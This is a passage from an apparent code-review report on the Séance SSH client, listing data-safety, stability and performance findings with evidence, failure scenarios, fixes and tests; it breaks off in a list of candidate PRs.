- **Location**: `services/managed_remote_file_store.dart:248-292` (`_loadUnlocked`), `:294-316` (`_sweepUnindexedCheckouts`); triggered from `app_state.dart:2200-2201` (`_restoreManagedEditSessions` → `reconcileAll()` at every launch).
- **Evidence**:
  ```dart
  } catch (_) {
    _files.clear();
    await quarantineCorruptFile(indexFile);
    // ...Preserve all plaintext directories for manual recovery.
    canSweepUnindexed = false;          // only for THIS process
  }
  ...
  if (canSweepUnindexed) await _sweepUnindexedCheckouts();  // runs when index is simply missing
  ```
  The quarantine renames the index to `.corrupt`. On the next launch `indexFile.exists()` is false,
  so `canSweepUnindexed` stays true and every checkout directory is deleted recursively. The same
  happens whenever the index is missing and checkout directories remain.
- **Failure scenario**:
  1. The user has a managed checkout with un-uploaded edits.
  2. The index becomes unreadable. Triggers: a transient read error (every error is caught, not just
     parse errors); a downgrade after a future index version bump (`version != 1` quarantines); or
     the Windows delete-then-rename fallback losing the index (S3-08).
  3. Launch N quarantines the index and keeps the files. Launch N+1 finds no index and silently
     deletes all plaintext edits.
- **Repro**: `scratchpad/work-S3/repro/test/quarantine_sweep_test.dart`. Both cases fail as
  predicted: "launch 3 swept the only copy of the unsaved edit" and "swept without an index".
- **Fix**:
  1. Treat "no trustworthy index" as persistent. When quarantining, write a valid replacement index
     `{version:1, files:[], sweepInhibited:true}`, so later launches know not to sweep. When the index
     is missing but `checkoutRoot` has entries, set the same flag instead of sweeping. Clear the flag
     only through an explicit user action (see idea 1).
  2. Treat an index version higher than `_indexVersion` as read-only, not corrupt. Do not rename it
     and do not sweep. Disable managed-edit writes for the session with a clear error.
  3. Better still, have the sweep move unindexed directories to `sftp-checkouts-orphaned/` rather
     than delete them (this pairs with S3-12).
  4. Tests in `test/managed_remote_file_store_test.dart`:
     - quarantine, then reopen twice: the checkout still exists;
     - missing index with checkout directories: not swept;
     - index version 2: the file is left in place and checkouts are untouched;
     - a valid index plus an unindexed directory: still swept (current behaviour).
- **Effort** S–M.

#### S3-02 — Failed enrolment persists URL+token; later rounds push with the device-local key
- **Severity** P1 · **Category** bug/data-safety · **KNOWN** (ANALYSIS SOL-030: "Enrollment must not partially persist account settings/token on failure") + **NEW consequence** · **VERIFIED (trace)**
- **Location**:
  - `services/app_services.dart:450-454` (register) and `:504-508` (login): settings are saved and
    the token stored *before* `_rekeyVault`.
  - `app_services.dart:519-559` (`runSync` uses whatever `vaultKey` is loaded).
  - `app_state.dart:1786-1797` (`_scheduleAutoSync` gates only on `isSyncConfigured`, `app_services.dart:299-300`).
  - `services/local_settings_backend.dart:409-428`; `ui/settings_screen.dart` `_sync` (no rollback).
- **Evidence**:
  ```dart
  settings.syncBaseUrl = baseUrl;
  settings.syncUsername = username;
  await saveSettings();
  await masterKeys.putApiKey(syncTokenKeyName, client.token!);
  await _rekeyVault(keys.vaultKey);   // may throw: KeystoreException, VaultLockedException, StateError(journal)
  ```
- **Failure scenario**:
  1. `setKeystoreKey` fails after the token write succeeded. The existing test
     `sync_client_lifetime_test.dart` models exactly this with `refuseMasterKey`. `stageRekey` can
     also throw, from a pending journal, a full disk, or a vault that is still locked.
  2. The UI shows "Failed: …", but `syncBaseUrl` is persisted and the token is in the keystore.
  3. The next server or snippet save calls `_scheduleAutoSync` → `runSync`, which seals every local
     record with the device-local random key (`RecordCodec(vaultKey)`) and pushes it. App startup
     does the same through `load()` → `_autoSync()`.
  4. Any device running `loginSync` decrypts the *first* live record to verify the passphrase
     (`app_services.dart:491-503`). If that record is one sealed with the device key, enrolment fails
     with "passphrase could not decrypt". A retry from the same device fails the same way.
  5. The account stays poisoned until someone deletes the records server-side.

  The same missing guard lets SOL-031's minted key (S3-04) push records under a random key while the
  token survives.
- **Fix**:
  1. **Reorder.** Derive keys, then call `register`/`login` (and verify, for login), then
     `_rekeyVault(keys.vaultKey)`, then `putApiKey(token)`, then save settings. If the rekey fails,
     nothing is persisted. If the token write fails after the rekey, the vault is on the shared key,
     which is harmless: the keystore holds it, and sync stays "not set up".
  2. **Defense in depth.** Add `AppSettings.syncKeyCheck`: base64 of
     HMAC-SHA256(vaultKey, `"seance/v1/sync-key-check"`), written after a successful enrolment. In
     `runSync`, refuse with "This device's vault key does not match the sync account — log in again"
     before any request when the check exists and does not match. Migration for existing installs: if
     the check is absent, set it after a round in which a pulled sealed record decrypted; if records
     were pulled and none decrypted, refuse to push.
  3. **Serialize.** Run the local phase of enrolment through `AppState._mutate`. Add
     `AppState.enrollSync` and call it from `LocalSettingsBackend.enrollSync`, so a re-enrolment
     cannot swap vault generations under an in-flight round. Today a round that captured
     `SecretVault(oldKey)` can write old-key blobs into the new generation after `settleRekey`.
  4. **Tests**, extending `test/sync_client_lifetime_test.dart` and reusing `_SelectiveKeystore`:
     - with `refuseMasterKey=true`, `registerSync` throws and afterwards
       `services.isSyncConfigured == false` and `getApiKey('sync.token') == null`;
     - `runSync` then makes zero HTTP requests;
     - swap the stored master key and re-initialize: `runSync` throws a key-mismatch error and pushes
       nothing.
- **Effort** M.

#### S3-03 — One unreadable or undeletable checkout aborts `AppState.load()`, so the app cannot start
- **Severity** P2 (rare trigger, total failure) · **Category** stability · **NEW** · **VERIFIED (reproduced for the sweep path; traced for the hash path)**
- **Location**:
  - `managed_remote_file_store.dart:304-315`: the sweep deletes without try/catch.
  - `:356-371`: `_reconcileUnlocked` rethrows a non-missing `FileSystemException`.
  - `app_state.dart:647`: `await _restoreManagedEditSessions();` is not guarded.
  - `main.dart:111-118` and `:231-239`: the error screen has no retry.
- **Evidence**: The repro `test/sweep_failure_test.dart` fails with
  `PathAccessException: Deletion failed ... ManagedRemoteFileStore._sweepUnindexedCheckouts ←
  _loadUnlocked ← reconcileAll`. The file was made immutable with `chattr +i`, as a stand-in for a
  file an editor holds open on Windows. `_loaded` is never set, so every later store call fails too.
- **Failure scenario**:
  - Windows: a stray or unindexed checkout is still open in an app that locks files (Office, Visual
    Studio). Every launch then shows "Failed to start Séance: PathAccessException…" until that app is
    closed or the user deletes app-support files by hand.
  - The same happens on any platform when an indexed checkout cannot be read (EACCES after
    `sudo`-editing it in place, or EIO).
  - The whole terminal client becomes unusable because of one file in the managed-edit side feature.
- **Fix**:
  1. In the sweep, wrap each entry in `try/catch` and log. A failed delete keeps the entry.
  2. In `_reconcileUnlocked`, catch `FileSystemException` when the file exists and return
     `copyWith(dirty: true)` (conservative: nothing will overwrite it), or add an `unreadable`
     runtime flag.
  3. In `AppState.load()`, wrap `_restoreManagedEditSessions()` in try/catch with
     `developer.log`, so startup never depends on it.
  4. Tests:
     - portable, via `IOOverrides.runZoned(createDirectory: …)` returning a `Directory` whose
       `delete` throws: `reconcileAll()` completes;
     - an `IOOverrides` `File` whose `openRead` throws: the entry comes back dirty, not as a thrown
       error;
     - an AppState test: `load()` completes when the store throws.
- **Effort** S.

#### S3-04 — Android and Windows keystore-loss triggers feed SOL-031's minting and orphan the existing vault
- **Severity** P1 · **Category** cross-platform/data-safety · **KNOWN** (SOL-031 "missing keystore key is not first run"; its gate lists "Android backup restore") + **NEW concrete triggers** · **LIKELY**
- **Location**:
  - `services/secure_master_key.dart:53-64`: default `FlutterSecureStorage`, no `AndroidOptions`.
  - `:94-109`: `probeKeystore` mints on a `null` read.
  - `android/app/src/main/AndroidManifest.xml:16-20`: no `android:allowBackup`, so it defaults to true.
  - `app_services.dart:242-265`: `unlockVaultFromKeystore` is not single-flight.
- **Evidence**:
  - `flutter_secure_storage` 10.3.x: `AndroidOptions({... bool resetOnError = true ...})`
    (`lib/options/android_options.dart:80`). Its README says to disable Auto Backup: "It can cause
    exception `java.security.InvalidKeyException: Failed to unwrap key`".
  - `flutter_secure_storage_windows` 4.1.0 (`lib/src/flutter_secure_storage_windows_ffi.dart`)
    stores secrets in a DPAPI-sealed `flutter_secure_storage.dat` next to `vault.json`:
    - it **deletes the file** when `CryptUnprotectData` fails;
    - it returns `{}` on any read `FileSystemException`;
    - `write` does load → modify → non-atomic `writeAsBytes`.
- **Failure scenarios**:
  - **Android restore** (new phone, factory reset): Auto Backup restores `vault.json`, `servers.json`
    and the plugin's prefs, but not the Keystore key. The plugin fails to decrypt, `resetOnError`
    wipes the store and returns null, and `probeKeystore` mints key K2. Every restored credential then
    reads as absent: connects run with empty passwords (SOL-035), new secrets are sealed with K2, and
    the vault becomes mixed-key.
  - **Android privacy**: Auto Backup also uploads `sftp-checkouts/` (plaintext remote files),
    `command_stats.json` (command history) and `identity_reads.jsonl` to cloud backup and
    device-to-device transfer.
  - **Windows**: an admin password reset makes DPAPI blobs undecryptable, so the plugin deletes the
    file. A transient read error (sharing violation) reads as empty, and the mint's write then
    **replaces the whole store** with only the new key. The sync token and API keys are gone too, and
    the vault is orphaned.
  - **Concurrency**: two concurrent `unlockVaultFromKeystore` calls, from the toast Retry plus
    `resolveCredentials`/`runSync`, can both see null and mint two different keys. The keystore keeps
    one and memory may keep the other, so this session's writes are unreadable after restart.
- **Fix** (one PR):
  1. Manifest: add `android:allowBackup="false"` and `android:fullBackupContent="false"`, plus
     `android:dataExtractionRules="@xml/data_extraction_rules"` excluding everything, for API 31+.
  2. `MasterKeyManager` default storage: add
     `aOptions: AndroidOptions(resetOnError: false)`, so a decrypt failure surfaces as "unavailable,
     retry" instead of a silent wipe.
  3. Vault-aware minting: give `probeKeystore` a `bool mayCreate` parameter. `AppServices` passes
     `mayCreate: !(await vaultStore.hasEntries())` (add `hasEntries` to `FileVaultStore`). When
     entries exist and no key is found, start locked with a distinct "vault key missing" state
     rather than minting. The full recovery UX stays SOL-031's.
  4. Make `unlockVaultFromKeystore` single-flight
     (`_unlocking ??= _unlock().whenComplete(() => _unlocking = null)`).
  5. Tests:
     - `MasterKeyManager` over a fake storage: null read with `mayCreate: false` performs no write;
     - `AppServices.initialize` with a non-empty `vault.json` and an empty keystore: the vault is
       locked, the keystore unchanged, `vault.json` untouched;
     - two concurrent `unlockVaultFromKeystore()` calls: one keystore write, and both return the same
       key;
     - a Dart test that parses `AndroidManifest.xml` and asserts `allowBackup="false"`.
- **Effort** S–M.

#### S3-05 — `inactive` is treated as background: every refocus runs a full probe sweep and re-hashes all checkouts twice
- **Severity** P2 · **Category** performance/cross-platform (network noise) · **NEW** · **VERIFIED**
- **Location**:
  - `main.dart:105-109`: `setForeground(lifecycle == AppLifecycleState.resumed)`.
  - `app_state.dart:1966-1993`.
  - `seance_core/lib/src/probe/probe_service.dart:223-228, 241-243`: `resume()` sets
    `_immediateSweepPending`, which gives the next sweep a `Duration.zero` delay.
  - `services/remote_files_controller.dart:1300-1312`.
  - `ui/built_in_text_editor.dart:543-547`.
- **Evidence**: The `dart:ui` docs for `AppLifecycleState.inactive` say: "On non-web desktop
  platforms, this corresponds to an application that is not in the foreground, but still has visible
  windows." On Android it also covers a pulled-down notification shade and split screen.
- **Failure scenarios**:
  - A desktop user switches between Séance and a browser or editor. Each switch away pauses probing
    and abandons any in-flight sweep, because `pause()` bumps the generation. Each switch back runs an
    immediate TCP+banner probe of every unconnected server. Alternating every 10 s multiplies sshd
    `[preauth]` log noise by about 4.5 compared with the 45 s cadence. The comment on `setForeground`
    says this is exactly what the pause is meant to avoid.
  - Status dots go stale while the window sits visible on a second monitor.
  - Each refocus also runs `reconcileAll()` over all managed checkouts, then again per tab
    (`reconcileLocalCopies`). Each pass SHA-256-hashes each file on the UI isolate, and external-editor
    checkouts have no size limit. Each open built-in editor also re-stats its remote file. This bites
    hardest in the common desktop loop: edit in BBEdit, switch back, upload.
- **Fix**:
  1. In `main.dart`, ignore `inactive`:
     `switch (lifecycle) { resumed → setForeground(true); hidden || paused || detached → setForeground(false); inactive → no-op }`.
  2. Make `AppState.setForeground` idempotent (track `_foreground`).
  3. On resume, run one `managedRemoteFiles.reconcileAll()` and fan the results out to
     `tab.retainedLocalCopies` and each live controller, instead of hashing twice. Skip it entirely
     where directory watchers are active, which is desktop.
  4. Optional core follow-up: `ProbeService.resume()` schedules an immediate sweep only if the last
     completed sweep is older than `interval`.
  5. Test (widget test, via `bootstrap_test.dart`'s `initOverride`):
     `tester.binding.handleAppLifecycleStateChanged(AppLifecycleState.inactive)` leaves
     `services.probe.isPaused == false`; `hidden` pauses; `resumed` resumes once. A fake
     `ManagedRemoteFileStore` counts `reconcileAll` calls, and one resume should make exactly one.
- **Effort** S.

#### S3-06 — `closeTab` teardown is not exception-safe, so the SSH session leaks
- **Severity** P2 · **Category** stability · **NEW** · **VERIFIED (trace)**; trigger LIKELY on Windows
- **Location**:
  - `app_state.dart:2118-2151` (`closeTab`) and `:1381-1420` (`_disposeSession`).
  - `services/remote_files_controller.dart:1231-1238` (`deleteAllLocalCopies`).
  - `managed_remote_file_store.dart:166-182, 460-469` (`remove` → `target.delete()` throws).
- **Evidence**: `_disposeSession(tab, deleteLocalCopies: true)` first awaits
  `files.deleteAllLocalCopies()` and the retained-copy `remove()` loop. Only after that does it run
  `log.freeze()`, `session.close()`, `engine.dispose()` and `tab.dispose()`. `closeTab` has already
  removed the tab from `tabs`, and calls `notifyListeners()` and `_refreshKeepAlive()` only after the
  await.
- **Failure scenario**:
  1. On Windows a checkout is open in an app that locks it (Office, Visual Studio), so
     `File.delete()` fails with a sharing violation. Other triggers: an index flush failure (disk
     full), or an "unsafe checkout path" throw.
  2. `closeTab` throws. The UI handler does not catch it.
  3. The tab has vanished from `tabs`, but the SSH connection stays open for the rest of the process.
     Its keep-alive count stays stale (the Android foreground service stays up), the active-tab
     fallback never runs, and listeners are not notified.
  4. `deleteServer` → `closeAllTabsForServer` aborts the delete the same way.
- **Fix**:
  1. In `_disposeSession`, run the local-copy deletion inside `try { … } catch (e, s) { failures.add(e); log }`.
  2. Put `log.freeze`, `session.close()`/`engine.dispose()`, `logNotifier.dispose()` and
     `tab.dispose()` in a `finally` that always runs.
  3. In `closeTab`, apply the active-tab fallback, `notifyListeners()` and `_refreshKeepAlive()` in a
     `finally`.
  4. Report "N local copies could not be deleted and were kept" through a top toast. The copies stay
     in the index, so they resurface as a placeholder tab next launch rather than being lost.
  5. Test: in `app_state_mutation_test.dart`, seed a managed file before `state.load()` so a
     placeholder tab exists. Replace a parent of its checkout with a symlink (so
     `_deleteCheckoutUnlocked` throws; skip on Windows), then call `closeTab(placeholder.id)`. Expect
     it to complete, `state.tabs` to be empty, and the engine to be disposed (adding a listener to
     `engine.workingDirectory` throws).
- **Effort** S.

#### S3-07 — No quit guard: dirty built-in editor buffers and live sessions are dropped silently on quit
- **Severity** P2 · **Category** missing-feature/data-safety · **NEW** (`docs/STATUS.md:288-295`: "Séance registers no exit observer today") · **VERIFIED**
- **Location**:
  - `main.dart` has no `AppLifecycleListener(onExitRequested:)`.
  - `app_state.dart:306`: `EditorTab.dirty`.
  - `ui/terminal_pane.dart:115-164`: the close button asks, but quitting does not.
- **Failure scenario**: The user types into the built-in editor without saving and presses ⌘Q, or
  closes the main window on Windows or Linux. The in-memory buffer is gone, with no prompt.
  Closing the tab would have asked. Live SSH sessions die silently as well. Poltergeist already has
  such a guard (`app/poltergeist_app/lib/services/app_session_lifecycle.dart`), and the settings
  window already forwards exit requests to the app isolate (`RemoteSettingsBackend.requestAppExit`),
  so only the app-side observer is missing.
- **Fix**:
  1. In `_BootstrapState`, create an
     `AppLifecycleListener(onExitRequested: _confirmExit)`, disposed with the state.
  2. `_confirmExit` counts `state.tabs.whereType<EditorTab>().where((t) => t.dirty.value)` and
     connected sessions. When there are none it returns `AppExitResponse.exit`.
  3. Otherwise it shows a dialog on `navigatorKey.currentContext`: "Quit Séance? 2 files have unsaved
     changes; 3 sessions are connected." with Cancel and Quit. Reuse
     `editorKey.currentState?.confirmDiscard()` semantics.
  4. Mobile has no exit hook; see idea 3.
  5. Test: a widget test with `initOverride` opens an `EditorTab` through `openEditorTab`, sets
     `dirty.value = true`, and calls `await tester.binding.handleRequestAppExit()`. The dialog shows,
     and Cancel returns `AppExitResponse.cancel`. With nothing dirty the call returns `exit` and shows
     no dialog.
- **Effort** S–M.

#### S3-08 — Persistence failure paths can destroy the only copy
- **Severity** P2 · **Category** stability/data-safety · **KNOWN** (SOL-034: "rename fallback deletes the old destination…", "broad catches conflate malformed JSON with permissions/transient I/O"); the 2026-09-12 review fixed only the POSIX branch · **VERIFIED (reading)**
- **Location**:
  - `services/atomic_file.dart:66-75` (Windows fallback) and `:81-89` (`quarantineCorruptFile`).
  - `file_stores.dart:297-315` (`FileVaultStore._read`) and `:22-38` (the other stores).
  - `app_settings.dart:513-547` (`SettingsStore.load`).
- **Specifics not in the backlog wording**:
  1. **Windows fallback.** `if (await file.exists()) await file.delete(); await tmp.rename(file.path);`.
     If the destination is held with `FILE_SHARE_DELETE` (antivirus, indexer), the delete leaves it
     delete-pending and the second rename fails too. Only `*.tmp` survives, and **nothing ever reads
     `.tmp`**. On the next launch:
     - `vault.json` is missing, so the vault is empty and connects run with empty passwords;
     - `settings.json` is missing, so defaults load with a new `deviceId` and *no* recovery notice
       (`load()` returns `AppSettings()` without setting `_recoveredFromCorruptFile`);
     - `managed_remote_files.json` is missing, so S3-01 sweeps every checkout.

     The next write to the same path truncates the `.tmp` holding the old content.
  2. `quarantineCorruptFile` deletes any existing `*.corrupt` first (`atomic_file.dart:84`). A second
     bad-file event destroys the first quarantined vault or settings file.
  3. `FileVaultStore._read` quarantines on *any* exception, including `readAsString` I/O errors, and
     the app shows no notice. Settings get a toast; a vault reset looks like "all my passwords
     vanished".
  4. `SettingsStore.load`: when the read fails (not the parse), `raw` is null, so salvage returns bare
     defaults. The quarantine may also fail silently. `save(salvaged)` then overwrites the original
     file.
- **Fix**:
  1. In `_writeStringAtomically` on Windows, retry `tmp.rename` about 5 times with backoff (roughly
     20–200 ms), since antivirus handles are transient. As a fallback, rename
     `file → file.bak`, then `tmp → file`, then delete `file.bak`; never delete the destination.
  2. Add `recoverInterruptedWrite(File)`: if `file` is missing and `file.bak` or `file.tmp` exists and
     parses, restore it. Call it from each store's `_load`.
  3. Give quarantine names a UTC timestamp (`.corrupt-20260926T101500Z`) and keep the newest 5.
  4. In every `_load`, read outside the `try` and quarantine only on parse or shape errors. Let
     `FileSystemException` propagate, so the store stays unloaded and retries later.
  5. Add `AppServices.vaultWasRecovered` and show a toast like the settings one.
  6. Tests, extending `atomic_file_test.dart`:
     - an `IOOverrides` `File.rename` that throws once, then succeeds: content lands and no
       destination is deleted;
     - a missing file with a present `.tmp`: recovered;
     - two corrupt events: both `.corrupt-*` files remain;
     - a read throwing `FileSystemException`: no quarantine.
- **Effort** M.

#### S3-09 — Two desktop instances clobber each other's stores
- **Severity** P2 · **Category** data-safety · **KNOWN** (SOL-034: "Multiple Linux processes can write the same stores") · **VERIFIED**
- **Location**:
  - `linux/runner/my_application.cc:130-131`: `G_APPLICATION_NON_UNIQUE`.
  - `windows/runner/*.cpp`: no mutex.
  - Every file store caches in memory and writes whole snapshots (`file_stores.dart`).
- **Failure scenario**: The user starts Séance from the launcher twice (Linux or Windows). Instance A
  adds server X. Instance B, holding a stale cache, edits server Y and flushes a snapshot without X.
  X is gone. The same happens to known hosts, tombstones, managed index entries and `vault.json`.
- **Fix**:
  1. Early in `main()`, before `restoreAndTrack`, open `<appSupport>/.instance.lock` and call
     `RandomAccessFile.lock(FileLock.exclusive)`, which does not block and throws if the lock is held.
  2. If the lock is held, show a minimal "Séance is already running" window and exit. A later step
     could forward activation through a loopback port recorded in the lock file.
  3. Hold the handle for the process lifetime. The settings-window engine never takes the lock
     because it returns before this code.
  4. Test: a unit test of a small `InstanceLock.acquire(dir)` helper, where the second acquire in a
     spawned isolate or process fails. Dart `fcntl` locks are per process, so spawn with
     `Process.start(Platform.resolvedExecutable, [script])`.
- **Effort** S.

#### S3-10 — CommandStats can never learn a new command once the table is saturated
- **Severity** P3 · **Category** bug · **NEW** · **VERIFIED (reproduced)**
- **Location**: `services/command_stats.dart:41-55` (`record` → `_trim` keeps the top 400 by count).
- **Evidence**: Repro `test/command_stats_evict_test.dart`: after 400 commands each recorded twice,
  recording `kubectl get pods` 10 times gives `countFor == 0`. Each new command enters with count 1
  and is evicted in the same call. Dart's `List.sort` is not stable either, so ties are dropped
  arbitrarily.
- **Failure scenario**: A long-time opt-in user's suggestions freeze forever on old habits.
- **Fix**:
  1. Make `counts` insertion-ordered by recency: remove and re-insert the key on each record. When
     over capacity, evict the entry with the lowest count, oldest first, never the command just
     recorded.
  2. Optionally halve all counts on each trim, so stale habits decay.
  3. Test: the repro above, plus one that the evicted entry is the oldest with the lowest count.
- **Effort** S.

#### S3-11 — Renaming onto a path with a retained local copy orphans it; `update()` skips the uniqueness check
- **Severity** P3 · **Category** bug · **NEW** · **VERIFIED (trace)**
- **Location**:
  - `remote_files_controller.dart:335-365` (`renameEntry`).
  - `:367-372` (`deleteEntry` deliberately keeps the local copy).
  - `managed_remote_file_store.dart:148-162` (`update` has no duplicate-path check); `put` at
    `:118-132` has one.
- **Failure scenario**:
  1. Check out `b.txt` and edit it without uploading.
  2. Delete `b.txt` remotely; its copy is kept "recoverable".
  3. Rename `a.txt` to `b.txt`. The remote rename succeeds because `b.txt` no longer exists.
  4. `localCopies['b.txt']` is overwritten with a's copy, and `update()` writes a second index entry
     with the same `(serverId, editSessionId, remotePath)`.
  5. The old `b` edits are now invisible this session and are not deleted on tab close, so the
     plaintext leaks. On the next launch the placeholder map keeps only one of the two, and any
     future checkout of `b.txt` fails "A managed checkout already exists".
- **Fix**:
  1. In `renameEntry`, before calling `remote.rename`, refuse when `localCopies` already holds the
     target path or any affected target path. The error should say to "upload or discard the local
     copy of b.txt first".
  2. Apply `put()`'s duplicate check in `update()`.
  3. Test in `remote_files_controller_test.dart` with its fake FS: the rename is refused, and neither
     the remote side nor the index changes.
- **Effort** S.

#### S3-12 — Managed checkouts whose server is gone are never surfaced or cleaned
- **Severity** P3 · **Category** data-safety/privacy · **NEW** (related: ANALYSIS "Expose retained plaintext edits/storage/discard") · **VERIFIED**
- **Location**: `app_state.dart:2204-2205` (`if (!configs.containsKey(copy.serverId)) continue;`). The
  sweep never deletes indexed entries.
- **Failure scenario**: A server is deleted on another device and the deletion arrives by sync, or
  `servers.json` is quarantined or lost. Its managed checkouts, possibly holding unsaved edits, stay in
  app support indefinitely. No tab or UI lists them, so the edits are unreachable and the plaintext is
  retained forever.
- **Fix**:
  1. Restore such groups as placeholder tabs using a config reconstructed from the managed record, or
     collect them into a "Recovered edits" list (idea 1) with Open, Reveal, Export and Discard.
  2. Minimal slice: log them, and have `AppState.orphanedManagedFiles` feed a one-time toast.
  3. Test: seed a managed file for server `gone`, then call `load()`. The orphan is listed, not
     silently skipped.
- **Effort** M.

#### S3-13 — JSON stores: first-load race, and a failed flush leaves the cache mutated
- **Severity** P3 · **Category** data-safety · **KNOWN-ish** (SOL-034) · race **SPECULATIVE**, rollback **VERIFIED**
- **Location**:
  - `file_stores.dart:22-38, 82-97, 151-178, 541-556`: `_loaded` is set only after the awaited
    `exists`/`readAsString`.
  - `putServer`, `deleteServer`, `putSnippet`, `add` and `put` mutate `_cache` before `_flush`, with
    no restore.
- **Evidence**: `FileVaultStore` documents and fixes exactly this memoization race
  (`file_stores.dart:277-295`), but the other four stores keep the flag pattern.
- **Failure scenarios**:
  - Race: two first callers, for example a TOFU `get` during the startup auto-sync's `all()`,
    complete their reads out of order on the I/O pool. One of them `put`s. The other's late load
    re-inserts the stale entry, and the next flush persists it.
  - Rollback: `saveServer` fails on a full disk and the UI reports failure, but `_cache` already holds
    the edit. The next successful flush, or a sync `collectLocal`, commits or pushes the edit the user
    was told did not save.
- **Fix**:
  1. Copy `FileVaultStore`'s memoized `Future<void>? _loading` and its `_mutate` snapshot and restore
     into a small shared `_JsonMapStore<T>` base.
  2. Test: an `IOOverrides` write that throws leaves `getServer` returning the old value.
- **Effort** S.

#### S3-14 — Vault locked by a failed re-key settle: no notice, and errors blame the keyring
- **Severity** P3 · **Category** UX · **NEW** · **VERIFIED**
- **Location**:
  - `app_services.dart:199-214`: a settle failure sets `vaultKey = null`, but `keystoreStatus` stays
    `available`.
  - `main.dart:153-155`: the toast shows only when the status is `unavailable`.
  - `secure_master_key.dart:22-25`: the lock message says "OS keyring is locked… install
    gnome-keyring", including on macOS, Windows and Android.
- **Failure scenario**: A journal I/O error at boot locks the vault silently. Every connect then fails
  with advice to install gnome-keyring.
- **Fix**:
  1. Add `AppServices.vaultLockReason` (enum: `keystoreUnavailable`, `rekeyPending`,
     `keyMissing` for S3-04).
  2. Toast on any non-null reason.
  3. Make `VaultLockedException` messages platform- and reason-specific.
  4. Test: `keystore_resilience_test.dart`, with a journal file that is unreadable through
     `IOOverrides`.
- **Effort** S.

#### S3-15 — Settings window closed before `hello` → host believes it is visible
- **Severity** P3 · **Category** bug · **NEW** · **SPECULATIVE**
- **Location**: `services/settings_window.dart:188-201` (`closed` before connect sends nothing) and
  `:252-258` (`hello` sets `_visible = true` unconditionally).
- **Failure scenario**:
  1. The user opens Settings and closes the window before its engine says hello.
  2. `hello` then marks the window visible. Snapshots stream to a hidden window.
  3. The next `open()` sends `selectTab` instead of `show`, so the window reappears with its first,
     stale page rather than a fresh one.
- **Fix**:
  1. Track `_runnerShowing`: true on `open()`, false on `closed`.
  2. `hello` sets `_visible = _runnerShowing` and returns `{'hidden': true}` when it is false; the
     window side then starts with `page = null`.
  3. Test: extend `settings_window_test.dart`'s relay by sending `closed` before `hello`, then
     `open()`. The window should receive `show`.
- **Effort** S.

#### S3-16 — An auto-sync queued during a manual sync is dropped; overlapping rounds clear `syncing` early
- **Severity** P3 · **Category** bug · **NEW** · **VERIFIED (trace)**
- **Location**: `app_state.dart:1497-1512` (`syncNow` sets and clears `syncing` but ignores
  `_syncQueued`) and `:1802-1823`.
- **Failure scenario**: The user edits a server during a long manual Sync now. The debounced
  `_autoSync` sees `syncing`, sets `_syncQueued`, and returns. `syncNow` never drains the queue, so the
  edit waits up to 5 minutes, or until next launch on mobile. Separately, `syncNow` during an
  auto-sync clears `syncing` while the auto round is still running.
- **Fix**:
  1. Replace the flag with a counter (`_roundsInFlight`).
  2. Route both entry points through one `_runRound({required bool surfaceErrors})`, and have it
     re-run once when `_syncQueued` was set by anyone.
  3. Test: a fake HTTP client whose pull blocks on a `Completer`. Start `syncNow`, save a server, and
     advance 2 s with `fake_async`. After `syncNow` completes, the client sees a second push.
- **Effort** S.

#### S3-17 — Transfer progress calls `notifyListeners` for every SFTP chunk
- **Severity** P3 · **Category** performance · **NEW** · **VERIFIED**
- **Location**: `remote_files_controller.dart:1084-1092`, with `onProgress` called per chunk in
  `seance_core/lib/src/ssh/remote_file_system.dart:424-426, 549`.
- **Failure scenario**: A 1 GB download produces tens of thousands of notifications. Every listener of
  the controller, the whole Files pane, re-runs its listener and rebuilds each frame during transfers.
- **Fix**:
  1. Throttle `_updateProgress` notifications to about 10 Hz with a `Stopwatch`, and always notify
     on completion or failure.
  2. Test: 1 000 progress callbacks inside 10 ms produce ≤ 2 notifications.
- **Effort** S.

#### S3-18 — Windows app data, including plaintext checkouts, lives in Roaming AppData; Linux stores use the umask mode
- **Severity** P3 · **Category** cross-platform/privacy · **NEW** · **VERIFIED**
- **Location**:
  - `app_services.dart:157` uses `getApplicationSupportDirectory()`, which `path_provider_windows`
    maps to `FOLDERID_RoamingAppData`.
  - `sftp-checkouts/`, `command_stats.json` and `identity_reads.jsonl` all live there.
  - On Linux, `servers.json` and `managed_remote_files.json` (which carry hosts, users, identity paths
    and remote paths) are written with `AtomicFilePrivacy.processDefault`, while the audit log is
    restricted "because it names key paths".
- **Failure scenarios**:
  - Domain roaming profiles copy plaintext remote-file checkouts to the profile server and slow down
    logon.
  - On Linux homes with mode 0755, other local users can read the server inventory.
- **Fix**:
  1. Put `sftp-checkouts/` and other caches under `getApplicationCacheDirectory()` (LocalAppData on
     Windows), keeping a migration shim for existing installs.
  2. On Linux, `chmod 700` the app-support directory at startup, or write all stores `ownerOnly`.
  3. Also replace `Process.run('chmod', …)` in `remote_files_controller.dart:1319-1327` with the
     existing `posix` `chmod` (no subprocess, no PATH dependency).
- **Effort** S.

#### Minor notes (not worth their own entries)
- `app_state.dart:1841-1847`: the `Timer(…, services.saveCommandStats)` callback drops the returned
  Future, so a failed save becomes an unhandled async error. Pending stats (≤ 3 s) are also lost on
  quit.
- TOFU pins written by `hostKeyStore.put` (in core) never call `_scheduleAutoSync`, so a new pin
  syncs only on the next periodic or edit-triggered round.
- `importSshConfig` (`app_state.dart:1129-1142`) writes the config store outside `_mutate`. It is
  harmless today because imported rows have no `secretRef`, but it breaks the queue's stated invariant.
- STATUS item 5 (UTF-8 split across packets) is stale: `XtermTerminalEngine` already uses a chunked
  `Utf8Decoder` (`xterm_engine.dart:146-148`).

### 3. Best PR candidates

1. **S3-01 + S3-03: managed-edit store resilience** (about 200 lines including tests).
   - Tests first, in `test/managed_remote_file_store_test.dart`:
     - quarantine, then reopen twice: the checkout survives;
     - missing index with checkout directories: not swept;
     - index version 2: not renamed, not swept;
     - a directory whose delete throws (through `IOOverrides`): `reconcileAll` completes;
     - a checkout whose read throws: the entry is marked dirty.
   - Then:
     - add `sweepInhibited` to the index JSON (tolerant reader: absent means false);
     - on quarantine, immediately write a valid inhibited index;
     - set inhibit when the index is missing but the root is non-empty;
     - handle newer versions as read-only;
     - add per-entry try/catch in the sweep, and treat unreadable files as dirty in reconcile;
     - in `AppState.load`, wrap `_restoreManagedEditSessions` in try/catch and log.
   - Existing behaviour (sweep with a valid index) stays covered by the current tests.
2. **S3-02: enrolment ordering plus sync key guard** (about 250 lines).
   - Tests first, in `sync_client_lifetime_test.dart` with `_SelectiveKeystore(refuseMasterKey: true)`:
     - after the failed `registerSync`/`loginSync`, `isSyncConfigured` is false and the token is null;
     - `runSync` then makes zero requests;
